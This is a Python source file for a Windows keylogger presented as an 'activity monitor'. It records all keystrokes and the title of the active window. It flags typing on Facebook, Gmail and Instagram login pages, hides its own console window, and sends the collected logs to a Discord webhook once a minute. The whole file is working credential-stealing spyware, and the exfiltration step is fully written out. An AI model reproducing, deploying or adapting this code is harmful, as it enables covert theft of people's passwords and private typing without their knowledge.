import keyboard
import os
import sys
import time
import win32gui
import win32process
import psutil
import logging
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = 60  # Set the interval in seconds
WEBHOOK = "WEBHOOK_URL_HERE"

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class ActivityMonitor:
    def __init__(self, interval, report_method="webhook"):
        self.interval = interval
        self.report_method = report_method
        self.log = []
        self.start_time = datetime.now().strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()
        self.is_running = True
        self.last_window = ""
        self.current_form_fields = set()

    def get_active_window_info(self):
        """Get information about the active window."""
        try:
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            pid = win32process.GetWindowThreadProcessId(window)[1]
            process = psutil.Process(pid)
            return {
                'title': title,
                'process_name': process.name(),
                'pid': pid
            }
        except Exception as e:
            logging.error(f"Error getting window info: {e}")
            return None

    def detect_browser_activity(self, window_info):
        """Detect and categorize browser activity."""
        if not window_info:
            return None

        title = window_info['title'].lower()
        process = window_info['process_name'].lower()

        if "chrome.exe" in process and title != self.last_window:
            self.last_window = title
            return "The user opened Google Chrome"

        if "chrome.exe" in process and "google" in title:
            if "facebook" in title and "search" in title:
                return "The user searched for Facebook"

        if "chrome.exe" in process and "facebook" in title and "log in" in title:
            return "The user accessed Facebook login page"

        if "chrome.exe" in process and "gmail" in title and "sign in" in title:
            return "The user accessed Gmail login page"

        if "chrome.exe" in process and "instagram" in title and "log in" in title:
            return "The user accessed Instagram login page"

        return None

    def callback(self, event):
        """Handles key press events and logs them with context."""
        key = event.name
        timestamp = datetime.now().strftime('%H:%M:%S')

        window_info = self.get_active_window_info()

        key_mappings = {
            "space": " ",
            "enter": "[ENTER]\n",
            "decimal": ".",
            "backspace": "[BACKSPACE]",
            "tab": "[TAB]",
            "shift": "[SHIFT]",
            "ctrl": "[CTRL]",
            "alt": "[ALT]",
            "caps lock": "[CAPSLOCK]"
        }
        key = key_mappings.get(key, f"[{key.upper()}]" if len(key) > 1 else key)

        if window_info and ("facebook" in window_info['title'].lower() or
                            "gmail" in window_info['title'].lower() or
                            "instagram" in window_info['title'].lower()):
            if len(self.current_form_fields) < 2:
                self.current_form_fields.add(key)
                if len(self.current_form_fields) == 2:
                    self.log.append(f"[{timestamp}] Detected login attempt on {window_info['title']}")

        self.log.append(f"[{timestamp}] {key}")

        activity = self.detect_browser_activity(window_info)
        if activity:
            self.log.append(f"[{timestamp}] {activity}")

    def format_log(self):
        """Formats the logged activities into a readable string."""
        return "\n".join(self.log)

    def report_to_webhook(self):
        """Sends the logged activities to Discord via webhook."""
        try:
            webhook = DiscordWebhook(url=WEBHOOK)
            log_text = self.format_log()

            if len(log_text) > 2000:
                temp_path = os.path.join(os.getenv("TEMP"), "activity_report.txt")
                with open(temp_path, "w", encoding="utf-8") as file:
                    file.write(f"Activity Report - {self.username} ({self.start_time})\n\n")
                    file.write(log_text)

                with open(temp_path, "rb") as file:
                    webhook.add_file(file=file.read(), filename="activity_report.txt")

                os.remove(temp_path)
            else:
                embed = DiscordEmbed(
                    title=f"Activity Report - {self.username} ({self.start_time})",
                    description=f"```{log_text}```",
                    color=16711680
                )
                webhook.add_embed(embed)

            response = webhook.execute()
            if response.status_code != 200:
                logging.error(f"Webhook Error: {response.status_code}")
        except Exception as e:
            logging.error(f"Error sending webhook: {e}")

    def report(self):
        """Handles periodic reporting and clears the log."""
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()
            self.log = []
            self.current_form_fields.clear()

        if self.is_running:
            timer = Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

    def hide_console(self):
        """Hides the console window on Windows."""
        if sys.platform.startswith("win"):
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )

    def start(self):
        """Starts the activity monitor."""
        self.hide_console()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    monitor = ActivityMonitor(interval=SEND_REPORT_EVERY, report_method="webhook")
    try:
        monitor.start()
    except KeyboardInterrupt:
        monitor.is_running = False
        logging.info("Activity monitor stopped.")